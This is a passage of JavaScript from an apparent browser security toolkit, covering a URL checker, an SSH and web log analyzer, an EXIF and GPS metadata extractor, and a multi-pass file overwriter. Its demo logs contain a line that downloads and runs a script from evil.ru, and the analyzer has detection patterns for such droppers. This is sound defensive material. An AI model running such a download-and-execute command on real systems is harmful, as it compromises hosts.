      try { heuristicResult = analyzeURLHeuristic(rawUrl); } catch(e) { toast(e.message,'error'); }
    }
  }

  if(!heuristicResult && urlMode === 'vt') {
    // Still show URL breakdown for VT-only mode
    try { heuristicResult = analyzeURLHeuristic(rawUrl); } catch {}
  }

  renderVTResults(vtData, heuristicResult, rawUrl);
  if(vtError && !vtData) {
    const note = document.createElement('div');
    note.className = 'glass-sm mt-3';
    note.style.borderColor = 'rgba(255,51,102,0.2)';
    note.innerHTML = '<p style="font-size:11px;color:var(--danger)"><i class="fas fa-circle-xmark"></i> VirusTotal error: '+vtError+'</p>';
    document.getElementById('urlResult').querySelector('div').appendChild(note);
  }

  const domain = heuristicResult ? heuristicResult.hostname : rawUrl;
  const risk = vtData ? ((vtData.last_analysis_stats?.malicious||0) > 5 ? 'MALICIOUS' : (vtData.last_analysis_stats?.malicious||0) > 0 ? 'FLAGGED' : 'CLEAN') : heuristicResult?.risk || 'UNKNOWN';
  logActivity('URL: '+domain+' → '+risk+(vtData?' (VT)':''));
  toast('Analysis complete!','success');
  btn.disabled = false; btn.innerHTML = orig;
});

// =============================================
// LOG ANALYZER
// =============================================
const DEMO_LOGS=`Jan 15 08:23:01 server sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2
Jan 15 08:23:05 server sshd[1235]: Failed password for root from 192.168.1.100 port 22 ssh2
Jan 15 08:23:08 server sshd[1236]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:12 server sshd[1237]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:15 server sshd[1238]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 08:23:19 server sshd[1239]: Failed password for root from 10.0.0.55 port 22 ssh2
Jan 15 09:01:44 server sshd[1300]: Accepted password for ubuntu from 203.0.113.42 port 22 ssh2
Jan 15 09:02:11 server sudo[1301]: ubuntu : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
Jan 15 09:15:00 server cron[1400]: (root) CMD (/usr/bin/wget http://evil.ru/payload.sh -O /tmp/x && bash /tmp/x)
Jan 15 09:16:30 server kernel: [UFW BLOCK] IN=eth0 SRC=45.33.32.156 DST=10.0.0.1 PROTO=TCP DPT=3389
Jan 15 10:00:01 server sshd[1500]: Failed password for root from 185.220.101.7 port 22 ssh2
Jan 15 10:00:03 server sshd[1501]: Failed password for root from 185.220.101.7 port 22 ssh2
Jan 15 10:00:05 server sshd[1502]: Failed password for root from 185.220.101.7 port 22 ssh2
Jan 15 10:00:07 server sshd[1503]: Failed password for root from 185.220.101.7 port 22 ssh2
Jan 15 10:00:09 server sshd[1504]: Failed password for root from 185.220.101.7 port 22 ssh2
Jan 15 10:30:12 server apache2: 203.0.113.1 - - [15/Jan] "GET /wp-admin/admin-ajax.php HTTP/1.1" 404 290
Jan 15 10:30:15 server apache2: 203.0.113.1 - - [15/Jan] "POST /xmlrpc.php HTTP/1.1" 403 289`;

try {
setupDropZone('logDropZone','logFile',f=>{const r=new FileReader();r.onload=e=>{document.getElementById('logPasteArea').value=e.target.result.substring(0,50000);};r.readAsText(f);});
$on('clearLogBtn', 'click',()=>{document.getElementById('logPasteArea').value='';document.getElementById('logFile').value='';document.getElementById('logResult').innerHTML='<div style="text-align:center;color:var(--muted)"><i class="fas fa-scroll" style="font-size:40px;opacity:.15;margin-bottom:10px;display:block"></i><p class="text-xs" style="opacity:.5">Upload or paste log data</p></div>';toast('Cleared','info');});
$on('logDemoBtn', 'click',()=>{document.getElementById('logPasteArea').value=DEMO_LOGS;toast('Demo loaded!','info');});
} catch(e) { console.error('[CyberSuiteX] LogAnalyzer wiring error:', e); }

$on('logAnalyzeBtn', 'click',()=>{
  const logs=document.getElementById('logPasteArea').value.trim();
  if(!logs)return toast('Paste or upload log data','warn');
  const lines=logs.split('\n').filter(Boolean);
  const ipFails={},alerts=[];
  let successLogins=0,totalFails=0,blockedConns=0;
  lines.forEach((line,li)=>{
    const failMatch=line.match(/Failed password for (\S+) from ([\d.]+)/);
    if(failMatch){const[,user,ip]=failMatch;ipFails[ip]=(ipFails[ip]||0)+1;totalFails++;if(ipFails[ip]===5)alerts.push({sev:'high',icon:'fa-circle-xmark',title:'Brute Force: '+ip,detail:ipFails[ip]+'+ failed SSH attempts on "'+user+'"',line:li+1});}
    if(/Accepted password/.test(line)){successLogins++;const m=line.match(/Accepted password for (\S+) from ([\d.]+)/);if(m)alerts.push({sev:'medium',icon:'fa-triangle-exclamation',title:'Successful Login: '+m[2],detail:'User "'+m[1]+'" from '+m[2],line:li+1});}
    if(/UFW BLOCK/.test(line)){blockedConns++;const m=line.match(/SRC=([\d.]+).*DPT=(\d+)/);if(m)alerts.push({sev:'medium',icon:'fa-triangle-exclamation',title:'Firewall Block: '+m[1],detail:'Port '+m[2]+' blocked',line:li+1});}
    if(/wget http:\/\/|curl http:\/\//.test(line)&&/tmp|var|dev/.test(line))alerts.push({sev:'high',icon:'fa-circle-xmark',title:'Malicious Dropper',detail:'Downloads & executes remote script',line:li+1});
    if(/sudo.*COMMAND.*bash|sudo.*COMMAND.*sh/.test(line))alerts.push({sev:'high',icon:'fa-circle-xmark',title:'Privilege Escalation',detail:'sudo spawning interactive shell',line:li+1});
  });
  Object.entries(ipFails).filter(([ip,c])=>c>=3&&!alerts.some(a=>a.title.includes(ip))).forEach(([ip,c])=>alerts.push({sev:'medium',icon:'fa-triangle-exclamation',title:'Multiple Fails: '+ip,detail:c+' failed attempts',line:0}));
  const rd=document.getElementById('logResult');rd.style.display='block';rd.style.alignItems='flex-start';
  rd.innerHTML='<div style="width:100%"><div class="grid grid-cols-2 gap-2 mb-3">'+[['Lines',lines.length,'var(--cyan)'],['Failed Auth',totalFails,'var(--danger)'],['Success Login',successLogins,'var(--warn)'],['Alerts',alerts.length,'var(--danger)']].map(([l,v,c])=>'<div class="glass-sm text-center"><div style="font-size:18px;font-weight:800;color:'+c+';font-family:\'JetBrains Mono\'">'+v+'</div><div style="font-size:10px;color:var(--muted)">'+l+'</div></div>').join('')+'</div><h4 style="font-size:12px;font-weight:700;color:var(--text);margin-bottom:8px">Alerts ('+alerts.length+')</h4>'+
  (alerts.length?alerts.slice(0,20).map(a=>'<div class="alert-item sev-'+a.sev+'"><i class="fas '+a.icon+'" style="color:'+(a.sev==='high'?'var(--danger)':'var(--warn)')+';font-size:13px;flex-shrink:0;margin-top:1px"></i><div><p style="font-weight:700;font-size:12px;color:var(--text)">'+a.title+'</p><p style="font-size:10px;color:var(--muted)">'+a.detail+(a.line?' · Line '+a.line:'')+'</p></div></div>').join(''):'<p style="color:var(--accent);text-align:center;padding:16px">No anomalies detected</p>')+'</div>';
  addStats(1,logs.length);logActivity('Log: '+lines.length+' lines, '+alerts.length+' alerts');toast('Analysis: '+alerts.length+' alert(s)','success');
});

// =============================================
// METADATA EXTRACTOR
// =============================================
let metaFileRef=null;

function clearMetadata(){
  metaFileRef=null;document.getElementById('metaFile').value='';
  document.getElementById('metaPreview').style.display='none';document.getElementById('metaImg').src='';
  document.getElementById('metaExtractBtn').disabled=true;document.getElementById('metaFileInfo').style.display='none';
  document.getElementById('metaResult').innerHTML='<div style="text-align:center;color:var(--muted);padding:60px 0"><i class="fas fa-tags" style="font-size:40px;opacity:.15;margin-bottom:10px;display:block"></i><p class="text-xs" style="opacity:.5">Upload an image to extract metadata</p></div>';
  toast('Cleared','info');
}

setupDropZone('metaDropZone','metaFile',f=>{
  if(!f.type.startsWith('image/'))return toast('Images only','error');
  metaFileRef=f;
  const r=new FileReader();r.onload=e=>{document.getElementById('metaImg').src=e.target.result;document.getElementById('metaPreview').style.display='block';};r.readAsDataURL(f);
  document.getElementById('metaExtractBtn').disabled=false;
  const info=document.getElementById('metaFileInfo');info.style.display='block';
  info.innerHTML='<div class="glass-sm"><p style="font-size:12px;color:var(--text);font-weight:700">'+esc(f.name)+'</p><p style="font-size:10px;color:var(--muted)">'+(f.size/1024).toFixed(1)+' KB · '+esc(f.type||'Unknown')+'</p></div>';
});

try {
$on('clearMetadataBtn', 'click',clearMetadata);
$on('clearMetadataResultBtn', 'click',()=>{document.getElementById('metaResult').innerHTML='<div style="text-align:center;color:var(--muted);padding:60px 0"><i class="fas fa-tags" style="font-size:40px;opacity:.15;margin-bottom:10px;display:block"></i><p class="text-xs" style="opacity:.5">Upload an image to extract metadata</p></div>';});
} catch(e) { console.error('[CyberSuiteX] MetadataExtractor wiring error:', e); }

$on('metaExtractBtn', 'click',()=>{
  if(!metaFileRef)return toast('Upload a file first','warn');
  const btn=document.getElementById('metaExtractBtn');const orig=btn.innerHTML;btn.disabled=true;btn.innerHTML='<span class="spinner"></span> Extracting...';
  const reader=new FileReader();
  reader.onload=async(e)=>{
    const rd=document.getElementById('metaResult');rd.style.display='block';rd.style.alignItems='flex-start';
    try{
      let tags={};
      if(typeof ExifReader!=='undefined'){try{tags=ExifReader.load(e.target.result);}catch{}}
      const img=document.getElementById('metaImg');
      const fileSection={'Filename':metaFileRef.name,'File Size':(metaFileRef.size/1024).toFixed(2)+' KB','MIME Type':metaFileRef.type,'Last Modified':new Date(metaFileRef.lastModified).toLocaleString(),'Width':img.naturalWidth?img.naturalWidth+'px':'–','Height':img.naturalHeight?img.naturalHeight+'px':'–','Aspect Ratio':img.naturalWidth&&img.naturalHeight?(img.naturalWidth/img.naturalHeight).toFixed(3):'–'};
      const sections={'File Info':fileSection,'Camera & Device':{},'Photo Settings':{},'Date & Time':{},'GPS Coordinates':{},'Image Details':{},'Copyright & Author':{},'Other':{}};
      const cameraFields=['Make','Model','LensMake','LensModel','Software','HostComputer'];
      const photoFields=['ExposureTime','FNumber','ISOSpeedRatings','ExposureProgram','MeteringMode','Flash','FocalLength','FocalLengthIn35mmFilm','ExposureBiasValue','WhiteBalance','ShutterSpeedValue','ApertureValue','ExposureMode','SceneCaptureType'];
      const dateFields=['DateTimeOriginal','DateTimeDigitized','DateTime','CreateDate','ModifyDate','GPSDateStamp','GPSTimeStamp'];
      const gpsFields=['GPSLatitude','GPSLongitude','GPSAltitude','GPSSpeed','GPSImgDirection','GPSLatitudeRef','GPSLongitudeRef','GPSAltitudeRef'];
      const imageFields=['ImageWidth','ImageLength','BitsPerSample','Compression','Orientation','XResolution','YResolution','ResolutionUnit','ColorSpace','PixelXDimension','PixelYDimension'];
      const copyrightFields=['Copyright','Artist','ImageDescription','UserComment','XPTitle','XPAuthor'];
      let hasGPS=false,gpsLat=null,gpsLng=null;
      for(const[key,value]of Object.entries(tags)){
        if(!value||key==='MakerNote')continue;
        let val=value.description!==undefined?value.description:value.value;
        if(val===undefined||val===null||val==='')continue;
        val=String(val).trim();if(!val||val==='undefined')continue;
        if(key==='GPSLatitude'){gpsLat=val;hasGPS=true;}if(key==='GPSLongitude'){gpsLng=val;hasGPS=true;}
        if(cameraFields.includes(key))sections['Camera & Device'][key]=val;
        else if(photoFields.includes(key))sections['Photo Settings'][key]=val;
        else if(dateFields.includes(key))sections['Date & Time'][key]=val;
        else if(gpsFields.includes(key))sections['GPS Coordinates'][key]=val;
        else if(imageFields.includes(key))sections['Image Details'][key]=val;
        else if(copyrightFields.includes(key))sections['Copyright & Author'][key]=val;
        else if(!key.startsWith('_')&&!key.includes('Offset')&&!key.includes('Pointer'))sections['Other'][key]=val;
      }
      let gpsLink='';
      if(hasGPS&&gpsLat&&gpsLng){
        const parseDMS=dms=>{const m=String(dms).match(/([\d.]+)/g);if(m&&m.length>=3)return parseFloat(m[0])+parseFloat(m[1])/60+parseFloat(m[2])/3600;return parseFloat(dms);};
        const lat=parseDMS(gpsLat),lng=parseDMS(gpsLng);
        const latRef=tags.GPSLatitudeRef?.description||'N';const lngRef=tags.GPSLongitudeRef?.description||'E';
        const dlat=latRef==='S'?-lat:lat;const dlng=lngRef==='W'?-lng:lng;
        gpsLink='<a href="https://maps.google.com/?q='+dlat+','+dlng+'" target="_blank" class="gps-map-link" style="margin-top:8px;display:inline-flex"><i class="fas fa-map-marker-alt"></i> Open in Google Maps ('+dlat.toFixed(5)+', '+dlng.toFixed(5)+')</a>';
      }
      const sectionIcons={'File Info':'fa-file-image','Camera & Device':'fa-camera','Photo Settings':'fa-aperture','Date & Time':'fa-clock','GPS Coordinates':'fa-map-marker-alt','Image Details':'fa-tag','Copyright & Author':'fa-copyright','Other':'fa-tag'};
      let html='';
      for(const[sectionName,fields]of Object.entries(sections)){
        const rows=Object.entries(fields).map(([k,v])=>'<div class="exif-row"><span class="exif-key">'+k+'</span><span class="exif-val">'+String(v).replace(/</g,'&lt;').substring(0,200)+'</span></div>').join('');
        if(rows||sectionName==='File Info'){html+='<div class="exif-section"><div class="exif-section-title"><i class="fas '+(sectionIcons[sectionName]||'fa-tag')+'"></i> '+sectionName+'</div>'+rows+(sectionName==='GPS Coordinates'&&gpsLink?gpsLink:'')+'</div>';}
      }
      const totalFields=Object.keys(tags).length;
      if(totalFields===0)html+='<div class="glass-sm mt-3" style="border-color:rgba(255,170,0,0.2)"><p style="font-size:11px;color:var(--warn)"><i class="fas fa-info-circle"></i> No EXIF metadata found. May have been stripped by camera, editor, or social media upload.</p></div>';
      rd.innerHTML='<div style="width:100%"><div class="flex items-center justify-between mb-3"><p style="color:var(--accent);font-weight:700;font-size:13px"><i class="fas fa-check-circle"></i> Extracted '+totalFields+' tags</p><button class="btn btn-secondary btn-sm" class="export-meta-json-btn"><i class="fas fa-download"></i> Export JSON</button></div>'+html+'</div>';
      rd.querySelector('.export-meta-json-btn')?.addEventListener('click', exportMetaJSON);
      addStats(1,metaFileRef.size);logActivity('EXIF: '+metaFileRef.name+' → '+totalFields+' tags');toast('Extracted '+totalFields+' EXIF tags!','success');
    }catch(err){
      rd.innerHTML='<div style="padding:20px"><p style="color:var(--danger);font-weight:700"><i class="fas fa-circle-xmark"></i> EXIF Error: '+err.message+'</p></div>';
      toast('EXIF extraction failed','error');
    }
    btn.disabled=false;btn.innerHTML=orig;
  };
  reader.readAsArrayBuffer(metaFileRef);
});

function exportMetaJSON(){
  if(!metaFileRef)return;
  const reader=new FileReader();
  reader.onload=e=>{
    try{
      const tags=typeof ExifReader!=='undefined'?ExifReader.load(e.target.result):{};
      const out={file:{name:metaFileRef.name,size:metaFileRef.size,type:metaFileRef.type,lastModified:metaFileRef.lastModified},exif:{}};
      for(const[k,v]of Object.entries(tags)){if(v&&v.description!==undefined)out.exif[k]=v.description;}
      downloadText(metaFileRef.name+'_exif.json',JSON.stringify(out,null,2));toast('JSON exported!','success');
    }catch{toast('Export failed','error');}
  };
  reader.readAsArrayBuffer(metaFileRef);
}

// =============================================
// SECURE SHREDDER
// =============================================
let shredFileRef=null;

function clearShredder(){
  shredFileRef=null;document.getElementById('shredFile').value='';
  document.getElementById('shredFileInfo').style.display='none';document.getElementById('shredBtn').disabled=true;
  document.getElementById('shredResult').innerHTML='<div style="text-align:center;color:var(--muted)"><i class="fas fa-trash-can" style="font-size:40px;opacity:.15;margin-bottom:10px;display:block"></i><p class="text-xs" style="opacity:.5">Upload a file to shred</p></div>';
  toast('Cleared','info');
}

setupDropZone('shredDropZone','shredFile',f=>{
  if(f.size>MAX_SHRED_MB*1024*1024)return toast('Max '+MAX_SHRED_MB+'MB','error');
  shredFileRef=f;document.getElementById('shredBtn').disabled=false;
  const info=document.getElementById('shredFileInfo');info.style.display='block';
  info.innerHTML='<div class="glass-sm"><p style="font-size:12px;font-weight:700;color:var(--text)">'+esc(f.name)+'</p><p style="font-size:10px;color:var(--muted)">'+(f.size/1024).toFixed(1)+' KB · '+esc(f.type||'Unknown')+'</p></div>';
  toast('Loaded: '+f.name,'info');
});

$on('clearShredBtn', 'click',clearShredder);

$on('shredBtn', 'click',()=>{
  if(!shredFileRef)return;
  const std=document.getElementById('shredStandard').value;
  const outputFmt=document.getElementById('shredOutputFormat').value;
  const passDefs={
    dod3:[{label:'Pass 1: Write 0x00 (zeros)',fill:'zeros'},{label:'Pass 2: Write 0xFF (ones)',fill:'ones'},{label:'Pass 3: Write random data',fill:'random'}],
    dod7:[{label:'Pass 1: Write 0x00',fill:'zeros'},{label:'Pass 2: Write 0xFF',fill:'ones'},{label:'Pass 3: Write random',fill:'random'},{label:'Pass 4: Write 0x00',fill:'zeros'},{label:'Pass 5: Write 0xFF',fill:'ones'},{label:'Pass 6: Write random',fill:'random'},{label:'Pass 7: Final random + verify',fill:'random'}],
    gutmann:[...Array(35)].map((_,i)=>{if(i<4||i>31)return{label:'Pass '+(i+1)+': Random',fill:'random'};const gutP=[0x55,0xAA,0x92,0x49,0x24,0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0x92,0x49,0x24,0x6D,0xB6,0xDB,0x36,0x6D];return{label:'Pass '+(i+1)+': Pattern 0x'+gutP[i-4].toString(16).padStart(2,'0').toUpperCase(),fill:gutP[i-4]};}),
    random:[{label:'Pass 1: Write random data',fill:'random'}],
    zeros:[{label:'Pass 1: Write 0x00 (zero fill)',fill:'zeros'}]
  };
  const passes=passDefs[std];
  const btn=document.getElementById('shredBtn');btn.disabled=true;
  const rd=document.getElementById('shredResult');rd.style.display='block';rd.style.alignItems='flex-start';
  const fileSize=shredFileRef.size;const originalName=shredFileRef.name;
  const reader=new FileReader();
  reader.onload=e=>{
    let buffer=new Uint8Array(e.target.result);
    const startT=Date.now();const log=[];let passIdx=0;
    function doPass(){
      if(passIdx>=passes.length){
        const hash=typeof CryptoJS!=='undefined'
          ?CryptoJS.SHA256(CryptoJS.lib.WordArray.create(buffer)).toString()
          :Array.from(crypto.getRandomValues(new Uint8Array(32))).map(b=>b.toString(16).padStart(2,'0')).join('');
        const elapsed=((Date.now()-startT)/1000).toFixed(2);
        const _rndHex=typeof CryptoJS!=='undefined'
          ?CryptoJS.lib.WordArray.random(8).toString()
          :Array.from(crypto.getRandomValues(new Uint8Array(8))).map(b=>b.toString(16).padStart(2,'0')).join('');
        let dlName;
        if(outputFmt==='bin')dlName=_rndHex+'.bin';
        else if(outputFmt==='txt')dlName=originalName+'.shredded.txt';
        else dlName=originalName+'.shredded';
        downloadBlob(dlName,new Blob([buffer],{type:'application/octet-stream'}));
        rd.innerHTML='<div style="width:100%"><div class="glass-sm mb-3" style="border-color:rgba(0,255,136,0.2)"><p style="color:var(--accent);font-weight:800;font-size:15px;margin-bottom:6px"><i class="fas fa-check-circle"></i> Shredding Complete — Downloaded</p><p style="font-size:12px;color:var(--muted)">'+originalName+' → '+dlName+'</p><div class="grid grid-cols-3 gap-2 mt-3">'+[['Passes',passes.length,'var(--danger)'],['Size',(fileSize/1024).toFixed(1)+'KB','var(--cyan)'],['Time',elapsed+'s','var(--warn)']].map(([l,v,c])=>'<div style="text-align:center;padding:8px;background:var(--input-bg);border-radius:7px"><div style="font-size:14px;font-weight:800;color:'+c+';font-family:\'JetBrains Mono\'">'+v+'</div><div style="font-size:9px;color:var(--muted)">'+l+'</div></div>').join('')+'</div></div><div class="glass-sm mb-3"><p style="font-size:10px;font-weight:700;color:var(--muted);margin-bottom:8px">PASS LOG</p>'+log.map((l,i)=>'<div style="display:flex;align-items:center;gap:8px;padding:4px 0;border-bottom:1px solid var(--border);font-size:10px"><i class="fas fa-check" style="color:var(--accent);width:12px"></i><span style="font-family:\'JetBrains Mono\',monospace;color:var(--muted)">Pass '+(i+1)+': '+l+'</span></div>').join('')+'</div><div class="glass-sm mb-3" style="border-color:rgba(0,212,255,0.2)"><p style="font-size:10px;font-weight:700;color:var(--cyan);margin-bottom:4px">POST-SHRED SHA-256</p><p style="font-size:10px;font-family:\'JetBrains Mono\',monospace;color:var(--muted);word-break:break-all">'+hash+'</p></div><div class="glass-sm" style="border-color:rgba(255,170,0,0.2)"><p style="font-size:11px;color:var(--warn)"><i class="fas fa-info-circle"></i> Overwritten file downloaded. Original on disk unchanged — use OS-level tools for physical secure deletion.</p></div></div>';
        btn.disabled=false;addStats(1,fileSize*passes.length);logActivity('Shredder: '+originalName+' — '+passes.length+' passes ('+std+')');toast('Shredding complete!','success');return;
      }
      const pass=passes[passIdx];const pct=Math.round(passIdx/passes.length*100);
      if(pass.fill==='zeros')buffer.fill(0);
      else if(pass.fill==='ones')buffer.fill(0xFF);
      else if(typeof pass.fill==='number')buffer.fill(pass.fill);
      else{const chunk=65536;for(let i=0;i<buffer.length;i+=chunk){const end=Math.min(i+chunk,buffer.length);const rnd=new Uint8Array(end-i);window.crypto.getRandomValues(rnd);buffer.set(rnd,i);}}
      log.push(pass.label);
      rd.innerHTML='<div style="width:100%"><p style="color:var(--danger);font-weight:700;margin-bottom:10px"><i class="fas fa-fire"></i> Shredding... Pass '+(passIdx+1)+'/'+passes.length+'</p><div class="progress-bar" style="margin-bottom:8px"><div class="progress-fill" style="width:'+pct+'%;background:var(--danger)"></div></div><p style="font-size:12px;color:var(--muted);margin-bottom:4px">'+std.toUpperCase()+' standard</p><p style="font-size:11px;color:var(--muted)">'+pass.label+'</p><p style="font-size:11px;color:var(--muted);margin-top:4px">'+originalName+' · '+(fileSize/1024).toFixed(1)+' KB</p></div>';
      passIdx++;
      setTimeout(doPass,passes.length>10?60:130);
    }
    doPass();
  };
  reader.readAsArrayBuffer(shredFileRef);
});
